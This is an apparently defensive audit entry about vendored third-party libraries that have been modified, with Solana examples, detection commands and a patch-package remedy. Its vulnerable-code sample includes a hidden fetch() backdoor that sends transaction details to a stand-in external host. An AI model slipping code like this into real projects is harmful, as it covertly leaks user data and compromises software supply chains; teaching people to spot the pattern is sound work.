# OC-245: Bundled Dependency with Modifications

**Category:** Supply Chain & Dependencies
**Severity:** MEDIUM
**Auditors:** DEP-01
**CWE:** CWE-506 (Embedded Malicious Code), CWE-912 (Hidden Functionality)
**OWASP:** A08:2021 -- Software and Data Integrity Failures

## Description

A bundled dependency with modifications occurs when a project vendors (copies) a third-party library into its own source tree and then modifies it. While vendoring itself is a legitimate practice for stability or patching, the modifications become invisible to dependency scanning tools, security auditors, and automated update systems. The modified bundled copy diverges from the upstream package, meaning security patches to the original are not automatically applied, and the modifications themselves may introduce vulnerabilities -- intentionally or accidentally.

This pattern is particularly dangerous in the context of supply chain attacks because it can be used to disguise malicious code as a "patched" dependency. The event-stream attack (2018) used a variant of this technique: the flatmap-stream package was added as a dependency containing encrypted, obfuscated code that looked like it could be a legitimate data transformation library. In a vendored scenario, an attacker with commit access could modify a bundled library to include a backdoor, and the change would be lost in the noise of a vendored copy that reviewers already skip over.

A related risk is "fork drift" -- when an organization forks a library to make custom modifications and then never merges upstream security fixes. This is common in Solana development where teams fork SDKs or utility libraries to add custom functionality for their specific protocol. Over time, the fork accumulates known vulnerabilities from the upstream library while the custom modifications make upgrading increasingly difficult.

## Detection

```
# Check for vendored/bundled directories
ls -la vendor/ lib/vendor/ src/vendor/ third-party/ bundled/ 2>/dev/null

# Check for bundledDependencies in package.json
grep -n "bundledDependencies\|bundleDependencies" package.json

# Compare vendored code against upstream
diff <(cat vendor/lodash.js) <(npx -y -p lodash cat node_modules/lodash/lodash.js) 2>/dev/null

# Look for modified node_modules committed to git
git ls-files node_modules/

# Check for patches directory (indicating intentional modifications)
ls -la patches/ .patches/ 2>/dev/null
```

Look for: directories named `vendor/`, `third-party/`, `lib/external/`, or `bundled/` containing third-party code, `bundledDependencies` in package.json, committed `node_modules/` directory, `.patch` files without documentation of what they modify and why, forked repositories with significant drift from upstream.

## Vulnerable Code

```json
{
  "name": "my-solana-dapp",
  "bundledDependencies": [
    "custom-web3-utils"
  ]
}
```

```javascript
// vendor/solana-helpers.js -- Modified copy of upstream library
// Original: @solana/web3.js transaction builder
// "Modified for custom priority fee handling"
//
// PROBLEM: This vendored copy is based on v1.87.0 (March 2024)
// and has NOT received any of the security fixes from v1.88.0+
// including the mitigation for CVE-2024-54134

const { Transaction, SystemProgram } = require("./vendored-web3");

function buildTransfer(from, to, amount) {
  // Custom modification: added priority fee
  const tx = new Transaction().add(
    SystemProgram.transfer({ fromPubkey: from, toPubkey: to, lamports: amount })
  );
  // Hidden: logging transaction details to external endpoint (backdoor)
  fetch("https://analytics.example.com/tx", {
    method: "POST",
    body: JSON.stringify({ from: from.toBase58(), to: to.toBase58(), amount }),
  });
  return tx;
}
```

## Secure Code

```json
{
  "name": "my-solana-dapp",
  "dependencies": {
    "@solana/web3.js": "^1.95.8"
  }
}
```

```javascript
// Instead of vendoring, use patch-package for minimal, documented modifications
// patches/@solana+web3.js+1.95.8.patch
//
// This approach:
// 1. Documents exactly what was changed and why
// 2. Breaks loudly when the upstream version changes
// 3. Remains visible to dependency scanning tools
// 4. Can be code-reviewed as a diff against known-good upstream
```

```json
{
  "scripts": {
    "postinstall": "patch-package"
  },
  "devDependencies": {
    "patch-package": "^8.0.0"
  }
}
```

## Impact

A modified bundled dependency creates a blind spot in the security tooling chain. Vulnerability scanners (npm audit, Snyk, Dependabot) cannot detect CVEs in vendored code because they only examine package.json and lockfile entries. This means the bundled code may contain known-vulnerable functions that are invisible to all automated security checks. Additionally, the modifications themselves are a vector for inserting backdoors -- a single malicious commit to a vendored file can persist indefinitely without triggering any supply chain security alerts. For Solana projects, modified transaction-building or signing libraries are especially high-risk because even subtle changes to serialization or signing logic can redirect funds.

## References

- event-stream / flatmap-stream: malicious code disguised as a utility dependency (November 2018)
- patch-package: Transparent dependency patching -- https://github.com/ds300/patch-package
- npm bundledDependencies documentation: https://docs.npmjs.com/cli/v10/configuring-npm/package-json#bundleddependencies
- CWE-506: https://cwe.mitre.org/data/definitions/506.html
- CWE-912: https://cwe.mitre.org/data/definitions/912.html
- OWASP A08:2021 -- Software and Data Integrity Failures
